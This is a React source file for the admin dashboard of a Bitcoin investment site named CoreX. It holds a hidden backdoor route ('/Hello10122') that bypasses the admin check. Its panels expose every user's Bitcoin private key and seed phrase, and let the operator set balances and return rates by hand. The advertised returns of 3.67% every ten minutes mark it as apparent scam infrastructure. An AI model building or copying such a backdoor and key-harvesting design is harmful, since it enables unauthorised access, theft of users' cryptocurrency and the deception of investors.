import { useAuth } from "@/hooks/use-auth";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import React from "react";
import type { User, InvestmentPlan } from "@shared/schema";
import { formatBitcoin } from "@/lib/utils";
import { BottomNavigation } from "@/components/bottom-navigation";
import { useLocation } from "wouter";
import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

interface AdminStats {
  totalUsers: number;
  totalBalance: string;
  activeInvestments: number;
}

export default function Admin() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [newBalance, setNewBalance] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const [planDialogOpen, setPlanDialogOpen] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState<string>("");
  const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
  const [vaultAddress, setVaultAddress] = useState("");
  const [depositAddress, setDepositAddress] = useState("");

  // Allow access via backdoor route or if user is admin
  const isBackdoorAccess = window.location.pathname === '/Hello10122';
  
  // Set backdoor access flag for other admin pages
  if (isBackdoorAccess) {
    sessionStorage.setItem('backdoorAccess', 'true');
  }

  if (!user?.isAdmin && !isBackdoorAccess) {
    setLocation('/');
    return null;
  }

  const { data: stats } = useQuery<AdminStats>({
    queryKey: ['/api/admin/stats'],
  });

  const { data: users } = useQuery<User[]>({
    queryKey: ['/api/admin/users'],
  });

  const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
    queryKey: ['/api/investment-plans'],
  });

  const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string}>({
    queryKey: ['/api/admin/config'],
  });

  // Update state when config data changes
  useEffect(() => {
    if (adminConfig && typeof adminConfig === 'object') {
      setVaultAddress((adminConfig as any).vaultAddress || "");
      setDepositAddress((adminConfig as any).depositAddress || "");
    }
  }, [adminConfig]);

  const updateConfigMutation = useMutation({
    mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ vaultAddress, depositAddress }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to update config');
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
      toast({
        title: "Configuration Updated",
        description: "Vault addresses have been successfully updated.",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updateBalanceMutation = useMutation({
    mutationFn: async ({ userId, balance }: { userId: number; balance: string }) => {
      const response = await fetch('/api/admin/update-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, balance }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
      setDialogOpen(false);
      setNewBalance("");
      setSelectedUser(null);
      toast({
        title: "Balance Updated",
        description: "User balance has been successfully updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const fetchPrivateKeyMutation = useMutation({
    mutationFn: async (userId: number) => {
      const response = await fetch(`/api/admin/user/${userId}/private-key`);
      if (!response.ok) throw new Error('Failed to fetch private key');
      return response.json();
    },
    onSuccess: (data, userId) => {
      setUserPrivateKeys(prev => ({ ...prev, [userId]: data.privateKey }));
      setShowPrivateKeys(prev => ({ ...prev, [userId]: true }));
      toast({ title: "Private Key Retrieved", description: "Private key loaded successfully" });
    },
    onError: () => {
      toast({ title: "Error", description: "Failed to fetch private key", variant: "destructive" });
    },
  });

  const syncAllBalancesMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/sync-all-balances', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Balances Synced",
        description: "All user balances synced with blockchain",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
    },
    onError: (error) => {
      toast({
        title: "Sync Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const testBitcoinGenMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/test-bitcoin-generation', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: (data) => {
      toast({
        title: data.success ? "Test Passed" : "Test Failed",
        description: data.message,
        variant: data.success ? "default" : "destructive",
      });
      console.log('Bitcoin Generation Test Results:', data);
    },
    onError: (error) => {
      toast({
        title: "Test Error",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanMutation = useMutation({
    mutationFn: async ({ userId, planId }: { userId: number; planId: number | null }) => {
      const response = await fetch('/api/admin/update-plan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, planId }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      setPlanDialogOpen(false);
      setSelectedPlan("");
      setSelectedUser(null);
      toast({
        title: "Plan Updated",
        description: "User investment plan has been successfully updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanAmountMutation = useMutation({
    mutationFn: async ({ planId, minAmount }: { planId: number; minAmount: string }) => {
      const response = await fetch('/api/admin/update-plan-amount', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ planId, minAmount }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/investment-plans'] });
      toast({
        title: "Plan Updated",
        description: "Investment plan minimum amount has been updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updatePlanRateMutation = useMutation({
    mutationFn: async ({ planId, dailyReturnRate }: { planId: number; dailyReturnRate: string }) => {
      const response = await fetch('/api/admin/update-plan-rate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ planId, dailyReturnRate }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/investment-plans'] });
      toast({
        title: "Plan Updated",
        description: "Investment plan daily return rate has been updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const handleUpdateBalance = (user: User) => {
    setSelectedUser(user);
    setNewBalance(user.balance);
    setDialogOpen(true);
  };

  const handleUpdatePlan = (user: User) => {
    setSelectedUser(user);
    setSelectedPlan(user.currentPlanId?.toString() || "0");
    setPlanDialogOpen(true);
  };

  const submitBalanceUpdate = () => {
    if (!selectedUser) return;

    updateBalanceMutation.mutate({
      userId: selectedUser.id,
      balance: newBalance,
    });
  };

  const submitPlanUpdate = () => {
    if (!selectedUser) return;

    const planId = selectedPlan === "0" ? null : parseInt(selectedPlan);
    updatePlanMutation.mutate({
      userId: selectedUser.id,
      planId,
    });
  };

  const togglePrivateKey = (userId: number) => {
    if (showPrivateKeys[userId]) {
      // Hide the private key
      setShowPrivateKeys(prev => ({ ...prev, [userId]: false }));
    } else {
      // Fetch and show the private key
      fetchPrivateKeyMutation.mutate(userId);
    }
  };

  const copyPrivateKey = (privateKey: string) => {
    navigator.clipboard.writeText(privateKey);
    toast({
      title: "Copied",
      description: "Private key copied to clipboard",
    });
  };

  return (
    <div className="max-w-sm mx-auto bg-background min-h-screen relative">
      {/* Header */}
      <header className="px-4 py-6 border-b dark-border">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-bitcoin flex items-center justify-center">
            <span className="text-black text-sm font-bold">₿</span>
          </div>
          <div>
            <h1 className="text-xl font-bold text-foreground">CoreX Admin</h1>
            <p className="text-xs text-muted-foreground">Dashboard</p>
          </div>
        </div>
      </header>

      <div className="p-4 space-y-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 gap-4">
          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Total Users</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-bitcoin">{stats?.totalUsers || 0}</p>
            </CardContent>
          </Card>

          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Total Balance</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-gold">{formatBitcoin(stats?.totalBalance || "0")} BTC</p>
            </CardContent>
          </Card>

          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Active Investments</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-green-400">{stats?.activeInvestments || 0}</p>
            </CardContent>
          </Card>
        </div>

        {/* Vault Configuration */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Settings className="w-5 h-5" />
              Vault Configuration
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div>
                <Label htmlFor="vaultAddress">Vault Address</Label>
                <Input
                  id="vaultAddress"
                  value={vaultAddress}
                  onChange={(e) => setVaultAddress(e.target.value)}
                  placeholder="Enter vault Bitcoin address"
                  className="mt-1"
                />
              </div>
              <div>
                <Label htmlFor="depositAddress">Deposit Address</Label>
                <Input
                  id="depositAddress"
                  value={depositAddress}
                  onChange={(e) => setDepositAddress(e.target.value)}
                  placeholder="Enter deposit Bitcoin address"
                  className="mt-1"
                />
              </div>
              <Button
                onClick={() => updateConfigMutation.mutate({ vaultAddress, depositAddress })}
                disabled={updateConfigMutation.isPending || !vaultAddress || !depositAddress}
                className="w-full bg-bitcoin hover:bg-bitcoin/90"
              >
                {updateConfigMutation.isPending ? "Updating..." : "Update Configuration"}
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Transaction Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Clock className="w-5 h-5" />
              Transaction Management
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              <Button
                onClick={() => setLocation('/admin-transactions')}
                className="w-full bg-blue-600 hover:bg-blue-700"
              >
                <Clock className="w-4 h-4 mr-2" />
                View Pending Transactions
              </Button>
              <Button
                onClick={() => setLocation('/admin-notifications')}
                variant="outline"
                className="w-full"
              >
                <Send className="w-4 h-4 mr-2" />
                Send Notifications
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Bitcoin Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Bitcoin className="w-5 h-5" />
              Bitcoin Management
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Button
              onClick={() => syncAllBalancesMutation.mutate()}
              disabled={syncAllBalancesMutation.isPending}
              className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
            >
              {syncAllBalancesMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Syncing Balances...
                </>
              ) : (
                <>
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Sync All User Balances with Blockchain
                </>
              )}
            </Button>
            <p className="text-xs text-muted-foreground mt-2">
              This will check all user Bitcoin addresses on the blockchain and update their balances accordingly.
            </p>
            <Button
              onClick={() => testBitcoinGenMutation.mutate()}
              disabled={testBitcoinGenMutation.isPending}
              className="w-full bg-green-500 hover:bg-green-500/90 text-black mt-4"
            >
              {testBitcoinGenMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Testing Bitcoin Generation...
                </>
              ) : (
                <>
                  <Bitcoin className="w-4 h-4 mr-2" />
                  Test Bitcoin Generation
                </>
              )}
            </Button>
            <p className="text-xs text-muted-foreground mt-2">
              This will run a test to ensure Bitcoin addresses and private keys can be generated correctly.
            </p>
          </CardContent>
        </Card>

        {/* Investment Plan Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <TrendingUp className="w-5 h-5" />
              Investment Plan Management
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {investmentPlans?.map((plan) => (
                <div key={plan.id} className="border rounded-lg p-4 space-y-3">
                  <div className="flex justify-between items-start">
                    <div>
                      <h4 className="font-medium text-foreground">{plan.name}</h4>
                      <p className="text-sm text-muted-foreground">
                        {plan.roiPercentage}% ROI over {plan.durationDays} days
                      </p>
                    </div>
                    <span 
                      className="px-2 py-1 rounded text-xs"
                      style={{ backgroundColor: plan.color + '20', color: plan.color }}
                    >
                      {plan.isActive ? 'Active' : 'Inactive'}
                    </span>
                  </div>
                  <div className="grid grid-cols-1 gap-3">
                    <div>
                      <Label htmlFor={`minAmount-${plan.id}`}>Minimum Amount (BTC)</Label>
                      <Input
                        id={`minAmount-${plan.id}`}
                        type="number"
                        step="0.00000001"
                        defaultValue={plan.minAmount}
                        placeholder="0.00000000"
                        className="mt-1"
                        onBlur={(e) => {
                          const newAmount = e.target.value;
                          if (newAmount && newAmount !== plan.minAmount) {
                            updatePlanAmountMutation.mutate({
                              planId: plan.id,
                              minAmount: newAmount
                            });
                          }
                        }}
                      />
                    </div>
                    <div>
                      <Label htmlFor={`dailyRate-${plan.id}`}>Daily Return Rate (%)</Label>
                      <Input
                        id={`dailyRate-${plan.id}`}
                        type="number"
                        step="0.0001"
                        defaultValue={(parseFloat(plan.dailyReturnRate) * 100).toFixed(4)}
                        placeholder="0.0000"
                        className="mt-1"
                        onBlur={(e) => {
                          const newRate = (parseFloat(e.target.value) / 100).toString();
                          if (newRate && newRate !== plan.dailyReturnRate) {
                            updatePlanRateMutation.mutate({
                              planId: plan.id,
                              dailyReturnRate: newRate
                            });
                          }
                        }}
                      />
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* User Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="text-foreground">User Management</CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="text-muted-foreground">Email</TableHead>
                    <TableHead className="text-muted-foreground">Balance</TableHead>
                    <TableHead className="text-muted-foreground">Investment Plan</TableHead>
                    <TableHead className="text-muted-foreground">Private Key</TableHead>
                      <TableHead>Seed Phrase</TableHead>
                    <TableHead>Actions</TableHead>
                    </TableRow>
                </TableHeader>
                <TableBody>
                  {users?.map((user) => {
                    const userPlan = investmentPlans?.find(plan => plan.id === user.currentPlanId);
                    return (
                      <TableRow key={user.id}>
                      <TableCell className="text-foreground">{user.email}</TableCell>
                      <TableCell className="text-bitcoin">{formatBitcoin(user.balance)} BTC</TableCell>
                      <TableCell className="text-foreground">
                        {userPlan ? (
                          <span className="px-2 py-1 rounded text-xs" style={{ backgroundColor: userPlan.color + '20', color: userPlan.color }}>
                            {userPlan.name}
                          </span>
                        ) : (
                          <span className="text-muted-foreground text-xs">Free Plan</span>
                        )}
                      </TableCell>
                      <TableCell>
                       {showPrivateKeys[user.id] ? (
                          <div className="flex items-center gap-2">
                            <Input
                              type="text"
                              value={userPrivateKeys[user.id] || ""}
                              readOnly
                              className="bg-muted text-xs"
                            />
                            <Button
                              size="sm"
                              onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
                              className="bg-green-500 hover:bg-green-500/90 text-black"
                            >
                              Copy
                            </Button>
                          </div>
                        ) : (
                          <Button
                            size="sm"
                            onClick={() => togglePrivateKey(user.id)}
                            className="bg-blue-500 hover:bg-blue-500/90 text-black"
                          >
                            Show
                          </Button>
                        )}
                      </TableCell>
                      <TableCell className="text-foreground">
                        {user.seedPhrase ? (
                          <span className="text-xs">{user.seedPhrase}</span>
                        ) : (
                          <span className="text-muted-foreground text-xs">No Seed Phrase</span>
                        )}
                      </TableCell>
                      <TableCell>
                        <div className="flex gap-1">
                          <Button
                            size="sm"
                            onClick={() => handleUpdateBalance(user)}
                            className="bg-bitcoin hover:bg-bitcoin/90 text-black"
                          >
                            <Edit className="w-3 h-3" />
                          </Button>
                          <Button
                            size="sm"
                            onClick={() => handleUpdatePlan(user)}
                            variant="outline"
                            className="border-muted"
                          >
                            <Settings className="w-3 h-3" />
                          </Button>
                        </div>
                      </TableCell>
                      </TableRow>
                    );
                  })}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>

        {/* User Private Keys Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Key className="w-5 h-5" />
              User Private Keys (Admin Only)
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {users?.map((user) => (
                <div key={user.id} className="border rounded-lg p-4 space-y-2">
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-medium text-foreground">{user.email}</p>
                      <p className="text-sm text-muted-foreground">User ID: {user.id}</p>
                    </div>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => {
                        navigator.clipboard.writeText(user.privateKey || '');
                        toast({
                          title: "Copied",
                          description: "Private key copied to clipboard",
                        });
                      }}
                    >
                      <Copy className="w-3 h-3 mr-1" />
                      Copy Private Key
                    </Button>
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-medium text-muted-foreground">Bitcoin Address:</p>
                    <p className="text-xs font-mono bg-muted p-2 rounded break-all">{user.bitcoinAddress}</p>
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-medium text-muted-foreground">Private Key:</p>
                    <p className="text-xs font-mono bg-muted p-2 rounded break-all text-red-500">
                      {user.privateKey || 'No private key available'}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Update Balance Dialog */}
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="dark-card dark-border">
          <DialogHeader>
            <DialogTitle className="text-foreground">Update User Balance</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="email">User Email</Label>
              <Input
                id="email"
                value={selectedUser?.email || ""}
                disabled
                className="bg-muted"
              />
            </div>
            <div>
              <Label htmlFor="balance">New Balance (BTC)</Label>
              <Input
                id="balance"
                type="number"
                step="0.00000001"
                value={newBalance}
                onChange={(e) => setNewBalance(e.target.value)}
                placeholder="0.00000000"
              />
            </div>
            <div className="flex gap-2">
              <Button
                onClick={submitBalanceUpdate}
                disabled={updateBalanceMutation.isPending}
                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
              >
                {updateBalanceMutation.isPending ? "Updating..." : "Update Balance"}
              </Button>
              <Button variant="outline" onClick={() => setDialogOpen(false)}>
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Update Plan Dialog */}
      <Dialog open={planDialogOpen} onOpenChange={setPlanDialogOpen}>
        <DialogContent className="dark-card dark-border">
          <DialogHeader>
            <DialogTitle className="text-foreground">Update Investment Plan</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="userEmail">User Email</Label>
              <Input
                id="userEmail"
                value={selectedUser?.email || ""}
                disabled
                className="bg-muted"
              />
            </div>
            <div>
              <Label htmlFor="plan">Investment Plan</Label>
              <Select value={selectedPlan} onValueChange={setSelectedPlan}>
                <SelectTrigger>
                  <SelectValue placeholder="Select a plan" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="0">Free Plan (3.67% every 10 minutes)</SelectItem>
                  {investmentPlans?.filter(plan => plan.id && plan.id.toString().trim() !== '').map((plan) => (
                    <SelectItem key={plan.id} value={plan.id.toString()}>
                      {plan.name} - {(parseFloat(plan.dailyReturnRate) * 100).toFixed(2)}% daily
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="flex gap-2">
              <Button
                onClick={submitPlanUpdate}
                disabled={updatePlanMutation.isPending}
                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
              >
                {updatePlanMutation.isPending ? "Updating..." : "Update Plan"}
              </Button>
              <Button variant="outline" onClick={() => setPlanDialogOpen(false)}>
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Bottom spacing for navigation */}
      <div className="h-20"></div>

      {/* Bottom Navigation */}
      <BottomNavigation />
    </div>
  );
}